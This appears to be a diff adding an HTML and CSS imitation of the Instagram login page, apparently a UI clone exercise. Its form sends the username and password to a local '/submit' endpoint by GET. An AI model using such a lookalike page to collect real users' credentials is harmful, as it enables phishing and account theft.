@@ -1,0 +1,117 @@
+<html>
+    <head>
+        <title>
+            Instagram Login Page
+        </title>
+        <style>
+            body {
+                font-family: Roboto, Arial;
+                background-color: #1F1F22;
+                color: white;
+                margin-top: 80px;
+                max-width: 400px;
+                margin-left: auto;
+                margin-right: auto;
+            }
+            .login-form {
+                display: flex;
+                flex-direction: column;
+                justify-content: center;
+                gap: 12px;
+            }
+            .other-options {
+                display: flex;
+                flex-direction: column;
+                gap: 12px;
+            }
+            .login-para {
+                font-size: 14px;
+                font-weight: 600;
+                margin-bottom: 20px;
+            }
+            .create-account-button {
+                border: solid 1px rgb(69, 153, 255);
+                color: rgb(69, 153, 255);
+                background-color: transparent;
+                border-radius: 16px;
+                padding: 10px 16px;
+                font-size: 12px;
+            }
+            .login-with-facebook-button {
+                border: solid 1px rgba(128, 128, 128, 0.6);
+                color: white;
+                background-color: transparent;
+                border-radius: 16px;
+                padding: 8px 16px;
+                margin-top: 30px;
+                font-size: 12px;
+            }
+            .login-button {
+                color: rgba(255, 255, 255, 0.403);
+                font-size: 12px;
+                background-color: rgba(15, 97, 198, 0.684);
+                border: solid 0.5px rgba(128, 128, 128, 0.6);
+                border-radius: 16px;
+                padding: 10px 16px;
+                margin-top: 4px;
+            }
+            .forgot-password-button {
+                background-color: transparent;
+                color: white;
+                border: none;
+                font-size: 12px;
+                border-radius: 16px;
+                padding: 10px 16px;
+            }
+            .forgot-password-button:hover {
+                background-color: rgb(66, 66, 66);
+            }
+            .username {
+                background-color: transparent;
+                border: solid 0.5px rgba(128, 128, 128, 0.6);
+                border-radius: 16px;
+                font-size: 12px;
+                font-weight: 500;
+                color: rgb(245, 245, 245);
+                padding: 16px 12px;
+            }
+            .password {
+                background-color: transparent;
+                border: solid 0.5px rgba(128, 128, 128, 0.6);
+                border-radius: 16px;
+                font-size: 12px;
+                font-weight: 500;
+                color: rgb(245, 245, 245);
+                padding: 16px 12px;
+            }
+            .password:hover, .username:hover {
+                border-color: rgba(231, 231, 231, 0.6);
+            }
+        </style>
+    </head>
+
+    <body>
+        <p class="login-para">Log into Instagram</p>
+
+        <form action="/submit" method="get" class="login-form">
+
+            <input class="username" name="username" id="username" placeholder="Mobile number, username, or email">
+            <input class="password" type="password" name="password" id="password" placeholder="Password">
+
+            <button class="login-button" type="submit">Log in</button>
+            <button class="forgot-password-button">Forgot password?</button>
+        </form>
+
+        <div class="other-options">
+            <button class="login-with-facebook-button">
+                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1lliihq x2lah0s x1k90msu x2h7rmj x1qfuztq xvpmsi5 xlup9mm x1kky2od"><path d="M22 12.037C22 6.494 17.523 2 12 2S2 6.494 2 12.037c0 4.707 3.229 8.656 7.584 9.741v-6.674H7.522v-3.067h2.062v-1.322c0-3.416 1.54-5 4.882-5 .634 0 1.727.125 2.174.25v2.78a12.807 12.807 0 0 0-1.155-.037c-1.64 0-2.273.623-2.273 2.244v1.085h3.266l-.56 3.067h-2.706V22C18.164 21.4 22 17.168 22 12.037z"></path></svg>
+                Log in with Facebook
+            </button>
+            <button class="create-account-button">                
+                Create new account
+            </button>
+        </div>
+        
+    </body>
+</html>
+
